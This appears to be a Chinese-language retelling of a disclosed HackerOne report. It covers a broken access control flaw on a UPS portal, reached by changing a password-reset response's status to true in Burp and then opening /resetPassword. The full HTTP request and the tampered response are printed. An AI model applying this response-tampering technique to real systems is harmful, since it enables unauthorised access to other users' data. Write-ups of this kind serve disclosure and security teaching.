
https://hackerone.com/reports/1539426

声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。


## 背景
nayefhamouda于2022年4月份提交的这个权限相关的漏洞:
白帽小哥发现可以越权访问团队管理面板;

## 复现步骤
1.登陆 connectnb.ups.com：

2.进入`https://connectnb.ups.com/Layout/forgotPassword`，输入任何电子邮件地址，拦截请求:
```
POST /api/Account/SendTempPassword/?userName=admin@admin.com HTTP/2
Host: connectnb.ups.com
Cookie: __RequestVerificationToken=ZSZXAd3wrj6GSWF1seZAIWIUPQiK4spv-xbaxR_3HxFgJnaSGKr7xXlb9iHYEUQVloknAoTtK5DmWtjdP7yVT7MQ6Z2JW3d5kK2qoxDAbas1
Content-Length: 0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"
Accept: application/json, text/plain, */*
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Sec-Ch-Ua-Platform: "Linux"
Origin: https://connectnb.ups.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,ar;q=0.7
```
3.在burp里面，拦截此请求的响应并将其中的status更改为 true
```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='https://connectnb.ups.com/'
Access-Control-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: Wed, 13 Apr 2022 05:09:59 GMT
Content-Length: 89

{"status":true,"errorMessage":"Username does not exist. Please enter correct Username."}
```
4.然后，转到这个路径/resetPassword。您会注意到这个页面已经打开，没有问题:
![图](../images/broken.png)

发现可以越权查看用户或报告信息了;

这小哥挺有才华的,一边poc的时候还一边唱着rap   =====》==
链接: https://pan.baidu.com/s/1dMwwD3oU0Ahv5G3e1oJE9w  密码: 6j3v


